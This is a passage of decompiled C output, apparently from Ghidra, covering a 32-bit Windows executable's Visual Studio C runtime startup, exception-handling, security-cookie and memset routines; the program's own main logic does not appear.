  _DAT_0041b830 = 0xc0000409;
  _DAT_0041b834 = 1;
  _DAT_0041b840 = 1;
  _DAT_0041b844 = 2;
  _DAT_0041b90c = in_GS;
  _DAT_0041b910 = in_FS;
  _DAT_0041b914 = in_ES;
  _DAT_0041b918 = in_DS;
  _DAT_0041b91c = unaff_EDI;
  _DAT_0041b920 = unaff_ESI;
  _DAT_0041b924 = unaff_EBX;
  _DAT_0041b92c = uVar5;
  DAT_0041b938 = _DAT_0041b83c;
  _DAT_0041b93c = in_CS;
  _DAT_0041b948 = in_SS;
  FUN_00402bb9((_EXCEPTION_POINTERS *)&PTR_DAT_004141a0);
  _DAT_0041b928 = (undefined4)((ulonglong)uVar11 >> 0x20);
  _DAT_0041b930 = (undefined4)uVar11;
  return;
}



void __cdecl FID_conflict__free(void *_Memory)

{
  FID_conflict__free(_Memory);
  return;
}



void __cdecl FUN_00402980(size_t param_1)

{
  int iVar1;
  
  while( true ) {
    iVar1 = FUN_00406f66(param_1);
    if (iVar1 != 0) break;
    iVar1 = __callnewh(param_1);
    if (iVar1 == 0) {
      if (param_1 == 0xffffffff) {
        FUN_004033d8();
      }
      else {
        FUN_004033bb();
      }
    }
  }
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3

int entry(void)

{
  code *pcVar1;
  bool bVar2;
  undefined4 uVar3;
  int iVar4;
  code **ppcVar5;
  uint *puVar6;
  uint uVar7;
  undefined4 uVar8;
  undefined4 uVar9;
  
  ___security_init_cookie();
  uVar3 = ___scrt_initialize_crt(1);
  if ((char)uVar3 != '\0') goto LAB_00402a66;
  do {
    ___scrt_fastfail(7);
LAB_00402a66:
    bVar2 = false;
    uVar3 = ___scrt_acquire_startup_lock();
  } while (DAT_0041bb4c == 1);
  if (DAT_0041bb4c == 0) {
    DAT_0041bb4c = 1;
    iVar4 = __initterm_e((undefined **)&DAT_00414168,(undefined **)&DAT_00414180);
    if (iVar4 != 0) {
      return 0xff;
    }
    __initterm((undefined **)&DAT_0041415c,(undefined **)&DAT_00414164);
    DAT_0041bb4c = 2;
  }
  else {
    bVar2 = true;
  }
  ___scrt_release_startup_lock((char)uVar3);
  ppcVar5 = (code **)FUN_00403082();
  if ((*ppcVar5 != (code *)0x0) &&
     (uVar3 = ___scrt_is_nonwritable_in_current_image((int)ppcVar5), (char)uVar3 != '\0')) {
    uVar9 = 0;
    uVar8 = 2;
    uVar3 = 0;
    pcVar1 = *ppcVar5;
    _guard_check_icall();
    (*pcVar1)(uVar3,uVar8,uVar9);
  }
  puVar6 = (uint *)FUN_00403088();
  if ((*puVar6 != 0) &&
     (uVar3 = ___scrt_is_nonwritable_in_current_image((int)puVar6), (char)uVar3 != '\0')) {
    __register_thread_local_exe_atexit_callback(*puVar6);
  }
  ___scrt_get_show_window_mode();
  __get_narrow_winmain_command_line();
  iVar4 = FUN_004027a1();
  uVar7 = ___scrt_is_managed_app();
  if ((char)uVar7 == '\0') {
    _exit(iVar4);
  }
  if (!bVar2) {
    __cexit();
  }
  ___scrt_uninitialize_crt('\x01','\0');
  return iVar4;
}



void __cdecl FUN_00402bb9(_EXCEPTION_POINTERS *param_1)

{
  HANDLE hProcess;
  UINT uExitCode;
  
  SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)0x0);
  UnhandledExceptionFilter(param_1);
  uExitCode = 0xc0000409;
  hProcess = GetCurrentProcess();
  TerminateProcess(hProcess,uExitCode);
  return;
}



void __cdecl FID_conflict__free(void *_Memory)

{
  FID_conflict__free(_Memory);
  return;
}



// Library Function - Single Match
//  struct _IMAGE_SECTION_HEADER * __cdecl find_pe_section(unsigned char * const,unsigned int)
// 
// Library: Visual Studio 2015 Release

_IMAGE_SECTION_HEADER * __cdecl find_pe_section(uchar *param_1,uint param_2)

{
  int iVar1;
  _IMAGE_SECTION_HEADER *p_Var2;
  _IMAGE_SECTION_HEADER *p_Var3;
  
  iVar1 = *(int *)(param_1 + 0x3c);
  p_Var2 = (_IMAGE_SECTION_HEADER *)
           (param_1 + (uint)*(ushort *)(param_1 + iVar1 + 0x14) + iVar1 + 0x18);
  p_Var3 = p_Var2 + *(ushort *)(param_1 + iVar1 + 6);
  while( true ) {
    if (p_Var2 == p_Var3) {
      return (_IMAGE_SECTION_HEADER *)0x0;
    }
    if ((p_Var2->VirtualAddress <= param_2) && (param_2 < p_Var2->Misc + p_Var2->VirtualAddress))
    break;
    p_Var2 = p_Var2 + 1;
  }
  return p_Var2;
}



// Library Function - Single Match
//  ___scrt_acquire_startup_lock
// 
// Library: Visual Studio 2015 Release

int ___scrt_acquire_startup_lock(void)

{
  int iVar1;
  int iVar2;
  bool bVar3;
  uint3 extraout_var;
  int iVar4;
  uint3 uVar5;
  int in_FS_OFFSET;
  
  bVar3 = ___scrt_is_ucrt_dll_in_use();
  if (CONCAT31(extraout_var,bVar3) == 0) {
    return (uint)extraout_var << 8;
  }
  iVar1 = *(int *)(*(int *)(in_FS_OFFSET + 0x18) + 4);
  while( true ) {
    iVar4 = 0;
    LOCK();
    iVar2 = iVar1;
    if (DAT_0041bb50 != 0) {
      iVar4 = DAT_0041bb50;
      iVar2 = DAT_0041bb50;
    }
    DAT_0041bb50 = iVar2;
    uVar5 = (uint3)((uint)iVar4 >> 8);
    if (iVar4 == 0) break;
    if (iVar1 == iVar4) {
      return CONCAT31(uVar5,1);
    }
  }
  return (uint)uVar5 << 8;
}



// Library Function - Single Match
//  ___scrt_initialize_crt
// 
// Library: Visual Studio 2015 Release

uint __cdecl ___scrt_initialize_crt(int param_1)

{
  uint uVar1;
  undefined4 uVar2;
  
  if (param_1 == 0) {
    DAT_0041bb6c = 1;
  }
  ___isa_available_init();
  uVar1 = ___vcrt_initialize();
  if ((char)uVar1 != '\0') {
    uVar2 = ___acrt_initialize();
    if ((char)uVar2 != '\0') {
      return CONCAT31((int3)((uint)uVar2 >> 8),1);
    }
    uVar1 = ___vcrt_uninitialize('\0');
  }
  return uVar1 & 0xffffff00;
}



// Library Function - Single Match
//  ___scrt_initialize_onexit_tables
// 
// Library: Visual Studio 2015 Release

uint __cdecl ___scrt_initialize_onexit_tables(int param_1)

{
  code *pcVar1;
  byte bVar2;
  bool bVar3;
  undefined3 extraout_var;
  uint uVar4;
  int iVar5;
  
  if ((param_1 != 0) && (param_1 != 1)) {
    ___scrt_fastfail(5);
    pcVar1 = (code *)swi(3);
    uVar4 = (*pcVar1)();
    return uVar4;
  }
  bVar3 = ___scrt_is_ucrt_dll_in_use();
  if ((CONCAT31(extraout_var,bVar3) == 0) || (param_1 != 0)) {
    bVar2 = 0x20 - ((byte)DAT_0041b004 & 0x1f) & 0x1f;
    DAT_0041bb54 = (0xffffffffU >> bVar2 | -1 << 0x20 - bVar2) ^ DAT_0041b004;
    uVar4 = CONCAT31((int3)(DAT_0041bb54 >> 8),1);
    DAT_0041bb58 = DAT_0041bb54;
    DAT_0041bb5c = DAT_0041bb54;
    DAT_0041bb60 = DAT_0041bb54;
    DAT_0041bb64 = DAT_0041bb54;
    DAT_0041bb68 = DAT_0041bb54;
  }
  else {
    uVar4 = __initialize_onexit_table(&DAT_0041bb54);
    if (uVar4 == 0) {
      iVar5 = __initialize_onexit_table(&DAT_0041bb60);
      uVar4 = -iVar5 & 0xffffff00U | (uint)(byte)(1 - (iVar5 != 0));
    }
    else {
      uVar4 = uVar4 & 0xffffff00;
    }
  }
  return uVar4;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___scrt_is_nonwritable_in_current_image
// 
// Library: Visual Studio 2015 Release

uint __cdecl ___scrt_is_nonwritable_in_current_image(int param_1)

{
  _IMAGE_SECTION_HEADER *p_Var1;
  uint uVar2;
  
  p_Var1 = find_pe_section((uchar *)&IMAGE_DOS_HEADER_00400000,param_1 - 0x400000);
  if ((p_Var1 == (_IMAGE_SECTION_HEADER *)0x0) || ((int)p_Var1->Characteristics < 0)) {
    uVar2 = (uint)p_Var1 & 0xffffff00;
  }
  else {
    uVar2 = CONCAT31((int3)((uint)p_Var1 >> 8),1);
  }
  return uVar2;
}



// Library Function - Single Match
//  ___scrt_release_startup_lock
// 
// Library: Visual Studio 2015 Release

int __cdecl ___scrt_release_startup_lock(char param_1)

{
  int iVar1;
  bool bVar2;
  undefined3 extraout_var;
  int iVar3;
  
  bVar2 = ___scrt_is_ucrt_dll_in_use();
  iVar1 = DAT_0041bb50;
  iVar3 = CONCAT31(extraout_var,bVar2);
  if ((iVar3 != 0) && (param_1 == '\0')) {
    DAT_0041bb50 = 0;
    iVar3 = iVar1;
  }
  return iVar3;
}



// Library Function - Single Match
//  ___scrt_uninitialize_crt
// 
// Library: Visual Studio 2015 Release

undefined4 __cdecl ___scrt_uninitialize_crt(char param_1,char param_2)

{
  undefined4 in_EAX;
  
  if ((DAT_0041bb6c == '\0') || (param_2 == '\0')) {
    ___acrt_uninitialize();
    in_EAX = ___vcrt_uninitialize(param_1);
  }
  return CONCAT31((int3)((uint)in_EAX >> 8),1);
}



// Library Function - Single Match
//  __onexit
// 
// Library: Visual Studio 2015 Release

_onexit_t __cdecl __onexit(_onexit_t _Func)

{
  int iVar1;
  byte bVar2;
  
  bVar2 = (byte)DAT_0041b004 & 0x1f;
  if (((DAT_0041b004 ^ DAT_0041bb54) >> bVar2 | (DAT_0041b004 ^ DAT_0041bb54) << 0x20 - bVar2) ==
      0xffffffff) {
    iVar1 = __crt_atexit(_Func);
  }
  else {
    iVar1 = __register_onexit_function(0x54,(char)_Func);
  }
  return (_onexit_t)(~-(uint)(iVar1 != 0) & (uint)_Func);
}



// Library Function - Single Match
//  _atexit
// 
// Libraries: Visual Studio 2015 Release, Visual Studio 2017 Release

int __cdecl _atexit(void *param_1)

{
  _onexit_t p_Var1;
  
  p_Var1 = __onexit((_onexit_t)param_1);
  return (p_Var1 != (_onexit_t)0x0) - 1;
}



// Library Function - Single Match
//  ___security_init_cookie
// 
// Library: Visual Studio 2015 Release

void __cdecl ___security_init_cookie(void)

{
  DWORD DVar1;
  uint local_18;
  uint local_14;
  _FILETIME local_10;
  uint local_8;
  
  local_10.dwLowDateTime = 0;
  local_10.dwHighDateTime = 0;
  if ((DAT_0041b004 == 0xbb40e64e) || ((DAT_0041b004 & 0xffff0000) == 0)) {
    GetSystemTimeAsFileTime(&local_10);
    local_8 = local_10.dwHighDateTime ^ local_10.dwLowDateTime;
    DVar1 = GetCurrentThreadId();
    local_8 = local_8 ^ DVar1;
    DVar1 = GetCurrentProcessId();
    local_8 = local_8 ^ DVar1;
    QueryPerformanceCounter((LARGE_INTEGER *)&local_18);
    DAT_0041b004 = local_14 ^ local_18 ^ local_8 ^ (uint)&local_8;
    if (DAT_0041b004 == 0xbb40e64e) {
      DAT_0041b004 = 0xbb40e64f;
    }
    else if ((DAT_0041b004 & 0xffff0000) == 0) {
      DAT_0041b004 = DAT_0041b004 | (DAT_0041b004 | 0x4711) << 0x10;
    }
    DAT_0041b000 = ~DAT_0041b004;
  }
  else {
    DAT_0041b000 = ~DAT_0041b004;
  }
  return;
}



undefined4 FUN_00403018(void)

{
  return 0;
}



undefined4 FUN_0040301b(void)

{
  return 1;
}



undefined4 FUN_0040301f(void)

{
  return 0x4000;
}



void FUN_00403025(void)

{
  InitializeSListHead((PSLIST_HEADER)&DAT_0041bb70);
  return;
}



void FUN_00403031(void)

{
  code *pcVar1;
  errno_t eVar2;
  
  eVar2 = __controlfp_s((uint *)0x0,0x10000,0x30000);
  if (eVar2 == 0) {
    return;
  }
  ___scrt_fastfail(7);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



void _guard_check_icall(void)

{
  return;
}



undefined * FUN_00403053(void)

{
  return &DAT_0041bb78;
}



void FUN_00403059(void)

{
  uint *puVar1;
  
  puVar1 = (uint *)FUN_00401000();
  *puVar1 = *puVar1 | 4;
  puVar1[1] = puVar1[1];
  puVar1 = (uint *)FUN_00403053();
  *puVar1 = *puVar1 | 2;
  puVar1[1] = puVar1[1];
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

bool FUN_00403076(void)

{
  return _DAT_0041b00c == 0;
}



undefined * FUN_00403082(void)

{
  return &DAT_0041cea8;
}



undefined * FUN_00403088(void)

{
  return &DAT_0041cea4;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  ___scrt_fastfail
// 
// Library: Visual Studio 2015 Release

void ___scrt_fastfail(undefined4 param_1)

{
  code *pcVar1;
  BOOL BVar2;
  LONG LVar3;
  undefined4 local_328 [39];
  EXCEPTION_RECORD local_5c;
  _EXCEPTION_POINTERS local_c;
  
  BVar2 = IsProcessorFeaturePresent(0x17);
  if (BVar2 != 0) {
    pcVar1 = (code *)swi(0x29);
    (*pcVar1)();
  }
  _DAT_0041bb80 = 0;
  _memset(local_328,0,0x2cc);
  local_328[0] = 0x10001;
  _memset(&local_5c,0,0x50);
  local_5c.ExceptionCode = 0x40000015;
  local_5c.ExceptionFlags = 1;
  BVar2 = IsDebuggerPresent();
  local_c.ExceptionRecord = &local_5c;
  local_c.ContextRecord = (PCONTEXT)local_328;
  SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)0x0);
  LVar3 = UnhandledExceptionFilter(&local_c);
  if (LVar3 == 0) {
    _DAT_0041bb80 = _DAT_0041bb80 & -(uint)(BVar2 == 1);
  }
  return;
}



// Library Function - Single Match
//  ___scrt_get_show_window_mode
// 
// Library: Visual Studio 2015 Release

WORD ___scrt_get_show_window_mode(void)

{
  undefined local_48 [48];
  WORD local_18;
  
  _memset(local_48,0,0x44);
  GetStartupInfoW((LPSTARTUPINFOW)local_48);
  if ((local_48[44] & 1) == 0) {
    local_18 = 10;
  }
  return local_18;
}



// Library Function - Single Match
//  ___scrt_unhandled_exception_filter@4
// 
// Libraries: Visual Studio 2015 Release, Visual Studio 2017 Release

undefined4 ___scrt_unhandled_exception_filter_4(int **param_1)

{
  int *piVar1;
  int iVar2;
  code *pcVar3;
  undefined4 uVar4;
  
  piVar1 = *param_1;
  if (((*piVar1 == -0x1f928c9d) && (piVar1[4] == 3)) &&
     ((iVar2 = piVar1[5], iVar2 == 0x19930520 ||
      (((iVar2 == 0x19930521 || (iVar2 == 0x19930522)) || (iVar2 == 0x1994000)))))) {
    _terminate();
    pcVar3 = (code *)swi(3);
    uVar4 = (*pcVar3)();
    return uVar4;
  }
  return 0;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00403229(void)

{
  _DAT_0041bb80 = 0;
  return;
}



// WARNING: Removing unreachable block (ram,0x00403241)
// WARNING: Removing unreachable block (ram,0x00403242)
// WARNING: Removing unreachable block (ram,0x00403248)
// WARNING: Removing unreachable block (ram,0x00403251)
// WARNING: Removing unreachable block (ram,0x00403258)

void FUN_00403231(void)

{
  return;
}



void _guard_check_icall(void)

{
  return;
}



// WARNING: This is an inlined function
// WARNING: Unable to track spacebase fully for stack
// WARNING: Variable defined which should be unmapped: param_2
// Library Function - Single Match
//  __SEH_prolog4
// 
// Libraries: Visual Studio 2015, Visual Studio 2017, Visual Studio 2019

void __cdecl __SEH_prolog4(undefined4 param_1,int param_2)

{
  int iVar1;
  undefined4 unaff_EBX;
  undefined4 unaff_ESI;
  undefined4 unaff_EDI;
  int *in_FS_OFFSET;
  undefined4 unaff_retaddr;
  uint auStack28 [5];
  undefined local_8 [8];
  
  iVar1 = -param_2;
  *(undefined4 *)((int)auStack28 + iVar1 + 0x10) = unaff_EBX;
  *(undefined4 *)((int)auStack28 + iVar1 + 0xc) = unaff_ESI;
  *(undefined4 *)((int)auStack28 + iVar1 + 8) = unaff_EDI;
  *(uint *)((int)auStack28 + iVar1 + 4) = DAT_0041b004 ^ (uint)&param_2;
  *(undefined4 *)((int)auStack28 + iVar1) = unaff_retaddr;
  *in_FS_OFFSET = (int)local_8;
  return;
}



// WARNING: This is an inlined function
// Library Function - Single Match
//  __SEH_epilog4
// 
// Libraries: Visual Studio 2015, Visual Studio 2017, Visual Studio 2019

void __SEH_epilog4(void)

{
  undefined4 *unaff_EBP;
  undefined4 *in_FS_OFFSET;
  undefined4 unaff_retaddr;
  
  *in_FS_OFFSET = unaff_EBP[-4];
  *unaff_EBP = unaff_retaddr;
  return;
}



undefined4 * __thiscall FUN_004032eb(void *this,exception *param_1)

{
  std::exception::exception((exception *)this,param_1);
  *(undefined ***)this = std::bad_alloc::vftable;
  return (undefined4 *)this;
}



undefined4 * __fastcall FUN_00403306(undefined4 *param_1)

{
  param_1[1] = 0;
  param_1[2] = 0;
  param_1[1] = "bad allocation";
  *param_1 = std::bad_alloc::vftable;
  return param_1;
}



undefined4 * __thiscall FUN_0040331e(void *this,exception *param_1)

{
  std::exception::exception((exception *)this,param_1);
  *(undefined ***)this = std::bad_array_new_length::vftable;
  return (undefined4 *)this;
}



undefined4 * __fastcall FUN_00403339(undefined4 *param_1)

{
  param_1[1] = 0;
  param_1[2] = 0;
  param_1[1] = "bad array new length";
  *param_1 = std::bad_array_new_length::vftable;
  return param_1;
}



// Library Function - Single Match
//  public: __thiscall std::exception::exception(class std::exception const &)
// 
// Libraries: Visual Studio 2015 Release, Visual Studio 2017 Release, Visual Studio 2019 Release

exception * __thiscall std::exception::exception(exception *this,exception *param_1)

{
  *(undefined ***)this = vftable;
  *(char **)(this + 4) = (char *)0x0;
  *(undefined4 *)(this + 8) = 0;
  ___std_exception_copy((char **)(param_1 + 4),(char **)(this + 4));
  return this;
}



undefined4 * __thiscall FUN_0040338e(void *this,byte param_1)

{
  *(undefined ***)this = std::exception::vftable;
  ___std_exception_destroy((void **)((int)this + 4));
  if ((param_1 & 1) != 0) {
    FUN_004035a8(this);
  }
  return (undefined4 *)this;
}



void FUN_004033bb(void)

{
  code *pcVar1;
  int local_10 [3];
  
  FUN_00403306(local_10);
  __CxxThrowException_8(local_10,&DAT_00419d5c);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



void FUN_004033d8(void)

{
  code *pcVar1;
  int local_10 [3];
  
  FUN_00403339(local_10);
  __CxxThrowException_8(local_10,&DAT_00419db0);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



char * __fastcall FUN_004033f5(int param_1)

{
  char *pcVar1;
  
  pcVar1 = *(char **)(param_1 + 4);
  if (pcVar1 == (char *)0x0) {
    pcVar1 = "Unknown exception";
  }
  return pcVar1;
}



// WARNING: Removing unreachable block (ram,0x00403443)
// WARNING: Removing unreachable block (ram,0x004034f3)
// WARNING: Removing unreachable block (ram,0x0040347d)
// Library Function - Single Match
//  ___isa_available_init
// 
// Library: Visual Studio 2015 Release

undefined4 ___isa_available_init(void)

{
  int *piVar1;
  uint *puVar2;
  int iVar3;
  uint uVar4;
  BOOL BVar5;
  uint uVar6;
  uint uVar7;
  uint in_XCR0;
  uint local_14;
  
  DAT_0041bb84 = 0;
  DAT_0041b010 = DAT_0041b010 | 1;
  BVar5 = IsProcessorFeaturePresent(10);
  uVar4 = DAT_0041b010;
  if (BVar5 != 0) {
    local_14 = 0;
    DAT_0041b010 = DAT_0041b010 | 2;
    DAT_0041bb84 = 1;
    piVar1 = (int *)cpuid_basic_info(0);
    puVar2 = (uint *)cpuid_Version_info(1);
    uVar7 = puVar2[3];
    if (((piVar1[2] ^ 0x49656e69U | piVar1[3] ^ 0x6c65746eU | piVar1[1] ^ 0x756e6547U) == 0) &&
       (((((uVar6 = *puVar2 & 0xfff3ff0, uVar6 == 0x106c0 || (uVar6 == 0x20660)) ||
          (uVar6 == 0x20670)) || ((uVar6 == 0x30650 || (uVar6 == 0x30660)))) || (uVar6 == 0x30670)))
       ) {
      DAT_0041bb88 = DAT_0041bb88 | 1;
    }
    if (6 < *piVar1) {
      iVar3 = cpuid_Extended_Feature_Enumeration_info(7);
      local_14 = *(uint *)(iVar3 + 4);
      if ((local_14 & 0x200) != 0) {
        DAT_0041bb88 = DAT_0041bb88 | 2;
      }
    }
    if ((uVar7 & 0x100000) != 0) {
      DAT_0041b010 = uVar4 | 6;
      DAT_0041bb84 = 2;
      if ((((uVar7 & 0x8000000) != 0) && ((uVar7 & 0x10000000) != 0)) && ((in_XCR0 & 6) == 6)) {
        DAT_0041b010 = uVar4 | 0xe;
        DAT_0041bb84 = 3;
        if ((local_14 & 0x20) != 0) {
          DAT_0041b010 = uVar4 | 0x2e;
          DAT_0041bb84 = 5;
        }
      }
    }
  }
  return 0;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  ___scrt_is_ucrt_dll_in_use
// 
// Library: Visual Studio 2015 Release

bool ___scrt_is_ucrt_dll_in_use(void)

{
  return _DAT_0041cea0 != 0;
}



void __cdecl FUN_004035a8(void *param_1)

{
  FID_conflict__free(param_1);
  return;
}



undefined4 * __thiscall FUN_004035b6(void *this,byte param_1)

{
  *(undefined ***)this = type_info::vftable;
  if ((param_1 & 1) != 0) {
    FUN_004035a8(this);
  }
  return (undefined4 *)this;
}



// Library Function - Single Match
//  _ValidateLocalCookies
// 
// Library: Visual Studio 2015 Release

void __cdecl _ValidateLocalCookies(int *param_1,int param_2)

{
  undefined in_DL;
  undefined extraout_DL;
  undefined1 unaff_DI;
  
  if (*param_1 != -2) {
    FUN_0040296a(param_1[1] + param_2 ^ *(uint *)(*param_1 + param_2),in_DL,unaff_DI);
    in_DL = extraout_DL;
  }
  FUN_0040296a(param_1[3] + param_2 ^ *(uint *)(param_1[2] + param_2),in_DL,param_1._0_1_);
  return;
}



// Library Function - Single Match
//  __except_handler4
// 
// Library: Visual Studio 2015 Release

undefined4 __cdecl __except_handler4(PEXCEPTION_RECORD param_1,PVOID param_2,undefined4 param_3)

{
  uint uVar1;
  code *pcVar2;
  int iVar3;
  BOOL BVar4;
  int *piVar5;
  uint uVar6;
  PEXCEPTION_RECORD pEVar7;
  undefined4 uVar8;
  PEXCEPTION_RECORD local_20;
  undefined4 local_1c;
  int local_18;
  uint *local_14;
  undefined4 local_10;
  int *local_c;
  char local_5;
  
  local_5 = '\0';
  local_10 = 1;
  local_18 = (int)param_2 + 0x10;
  piVar5 = (int *)(*(uint *)((int)param_2 + 8) ^ DAT_0041b004);
  local_c = piVar5;
  _ValidateLocalCookies(piVar5,local_18);
  _guard_check_icall();
  if ((*(byte *)&param_1->ExceptionFlags & 0x66) == 0) {
    local_20 = param_1;
    local_1c = param_3;
    *(PEXCEPTION_RECORD **)((int)param_2 + -4) = &local_20;
    uVar6 = *(uint *)((int)param_2 + 0xc);
    if (*(uint *)((int)param_2 + 0xc) == 0xfffffffe) {
      return local_10;
    }
    do {
      local_14 = (uint *)(piVar5 + uVar6 * 3 + 4);
      uVar1 = *local_14;
      if ((undefined *)piVar5[uVar6 * 3 + 5] != (undefined *)0x0) {
        iVar3 = __EH4_CallFilterFunc_8((undefined *)piVar5[uVar6 * 3 + 5]);
        local_5 = '\x01';
        if (iVar3 < 0) {
          local_10 = 0;
          piVar5 = local_c;
          goto LAB_0040373e;
        }
        if (0 < iVar3) {
          if (((param_1->ExceptionCode == 0xe06d7363) && (DAT_0041ceac != (code *)0x0)) &&
             (BVar4 = __IsNonwritableInCurrentImage((PBYTE)&DAT_0041ceac), pcVar2 = DAT_0041ceac,
             BVar4 != 0)) {
            uVar8 = 1;
            pEVar7 = param_1;
            _guard_check_icall();
            (*pcVar2)(pEVar7,uVar8);
          }
          __EH4_GlobalUnwind2_8(param_2,param_1);
          if (*(uint *)((int)param_2 + 0xc) != uVar6) {
            __EH4_LocalUnwind_16((int)param_2,uVar6,(int)param_2 + 0x10,&DAT_0041b004);
          }
          *(uint *)((int)param_2 + 0xc) = uVar1;
          _ValidateLocalCookies(local_c,(int)param_2 + 0x10);
          __EH4_TransferToHandler_8((undefined *)local_14[2]);
          pcVar2 = (code *)swi(3);
          uVar8 = (*pcVar2)();
          return uVar8;
        }
      }
      piVar5 = local_c;
      uVar6 = uVar1;
    } while (uVar1 != 0xfffffffe);
    if (local_5 == '\0') {
      return local_10;
    }
  }
  else {
    if (*(int *)((int)param_2 + 0xc) == -2) {
      return local_10;
    }
    __EH4_LocalUnwind_16((int)param_2,0xfffffffe,(int)param_2 + 0x10,&DAT_0041b004);
  }
LAB_0040373e:
  _ValidateLocalCookies(piVar5,local_18);
  return local_10;
}



// Library Function - Single Match
//  ___vcrt_initialize
// 
// Library: Visual Studio 2015 Release

uint ___vcrt_initialize(void)

{
  uint uVar1;
  undefined4 uVar2;
  
  ___vcrt_initialize_pure_virtual_call_handler();
  ___vcrt_initialize_winapi_thunks();
  uVar1 = ___vcrt_initialize_locks();
  if ((char)uVar1 != '\0') {
    uVar2 = ___vcrt_initialize_ptd();
    if ((char)uVar2 != '\0') {
      return CONCAT31((int3)((uint)uVar2 >> 8),1);
    }
    uVar1 = ___vcrt_uninitialize_locks();
  }
  return uVar1 & 0xffffff00;
}



// Library Function - Single Match
//  ___vcrt_uninitialize
// 
// Libraries: Visual Studio 2015 Release, Visual Studio 2017 Release

undefined4 __cdecl ___vcrt_uninitialize(char param_1)

{
  undefined4 in_EAX;
  
  if (param_1 == '\0') {
    ___vcrt_uninitialize_ptd();
    ___vcrt_uninitialize_locks();
    in_EAX = ___vcrt_uninitialize_winapi_thunks('\0');
  }
  return CONCAT31((int3)((uint)in_EAX >> 8),1);
}



// Library Function - Single Match
//  _memset
// 
// Libraries: Visual Studio 2015 Debug, Visual Studio 2015 Release

void * __cdecl _memset(void *_Dst,int _Val,size_t _Size)

{
  int iVar1;
  undefined *puVar2;
  int *piVar3;
  
  if (_Size == 0) {
    return _Dst;
  }
  iVar1 = (_Val & 0xffU) * 0x1010101;
  piVar3 = (int *)_Dst;
  if (0x20 < (int)_Size) {
    if (0x7f < (int)_Size) {
      puVar2 = (undefined *)_Dst;
      if ((DAT_0041bb88 >> 1 & 1) != 0) {
        for (; _Size != 0; _Size = _Size - 1) {
          *puVar2 = (char)iVar1;
          puVar2 = puVar2 + 1;
        }
        return _Dst;
      }
      if ((DAT_0041b010 >> 1 & 1) == 0) goto joined_r0x004038db;
      *(int *)_Dst = iVar1;
      *(int *)((int)_Dst + 4) = iVar1;
      *(int *)((int)_Dst + 8) = iVar1;
      *(int *)((int)_Dst + 0xc) = iVar1;
      piVar3 = (int *)((int)_Dst + 0x10U & 0xfffffff0);
      _Size = (int)_Dst + (_Size - (int)piVar3);
      if (0x80 < (int)_Size) {
        do {
          *piVar3 = iVar1;
          piVar3[1] = iVar1;
          piVar3[2] = iVar1;
          piVar3[3] = iVar1;
          piVar3[4] = iVar1;
          piVar3[5] = iVar1;
          piVar3[6] = iVar1;
          piVar3[7] = iVar1;
          piVar3[8] = iVar1;
          piVar3[9] = iVar1;
          piVar3[10] = iVar1;
          piVar3[0xb] = iVar1;
          piVar3[0xc] = iVar1;
          piVar3[0xd] = iVar1;
          piVar3[0xe] = iVar1;
          piVar3[0xf] = iVar1;
          piVar3[0x10] = iVar1;
          piVar3[0x11] = iVar1;
          piVar3[0x12] = iVar1;
          piVar3[0x13] = iVar1;
          piVar3[0x14] = iVar1;
          piVar3[0x15] = iVar1;
          piVar3[0x16] = iVar1;
          piVar3[0x17] = iVar1;
          piVar3[0x18] = iVar1;
          piVar3[0x19] = iVar1;
          piVar3[0x1a] = iVar1;
          piVar3[0x1b] = iVar1;
          piVar3[0x1c] = iVar1;
          piVar3[0x1d] = iVar1;
          piVar3[0x1e] = iVar1;
          piVar3[0x1f] = iVar1;
          piVar3 = piVar3 + 0x20;
          _Size = _Size - 0x80;
        } while ((_Size & 0xffffff00) != 0);
        goto LAB_004038a0;
      }
    }
    if ((DAT_0041b010 >> 1 & 1) != 0) {
LAB_004038a0:
      if (0x1f < _Size) {
        do {
          *piVar3 = iVar1;
          piVar3[1] = iVar1;
          piVar3[2] = iVar1;
          piVar3[3] = iVar1;
          piVar3[4] = iVar1;
          piVar3[5] = iVar1;
          piVar3[6] = iVar1;
          piVar3[7] = iVar1;
          piVar3 = piVar3 + 8;
          _Size = _Size - 0x20;
        } while (0x1f < _Size);
        if ((_Size & 0x1f) == 0) {
          return _Dst;
        }
      }
      piVar3 = (int *)((_Size - 0x20) + (int)piVar3);
      *piVar3 = iVar1;
      piVar3[1] = iVar1;
      piVar3[2] = iVar1;
      piVar3[3] = iVar1;
      piVar3[4] = iVar1;
      piVar3[5] = iVar1;
      piVar3[6] = iVar1;
      piVar3[7] = iVar1;
      return _Dst;
    }
  }
joined_r0x004038db:
  for (; (_Size & 3) != 0; _Size = _Size - 1) {
    *(char *)piVar3 = (char)iVar1;
    piVar3 = (int *)((int)piVar3 + 1);
  }
  if ((_Size & 4) != 0) {
    *piVar3 = iVar1;
    piVar3 = piVar3 + 1;
    _Size = _Size - 4;
  }
  for (; (_Size & 0xfffffff8) != 0; _Size = _Size - 8) {
    *piVar3 = iVar1;
    piVar3[1] = iVar1;
    piVar3 = piVar3 + 2;
  }
  return _Dst;
}



// Library Function - Single Match
//  ___std_exception_copy
// 
// Libraries: Visual Studio 2015 Release, Visual Studio 2017 Release, Visual Studio 2019 Release

void __cdecl ___std_exception_copy(char **param_1,char **param_2)

{
  char *pcVar1;
  char cVar2;
  char *_Dst;
  char *pcVar3;
  char *_Memory;
  
  if ((*(char *)(param_1 + 1) == '\0') || (pcVar3 = *param_1, pcVar3 == (char *)0x0)) {
    *param_2 = *param_1;
    *(undefined *)(param_2 + 1) = 0;
  }
  else {
    pcVar1 = pcVar3 + 1;
    do {
      cVar2 = *pcVar3;
      pcVar3 = pcVar3 + 1;
    } while (cVar2 != '\0');
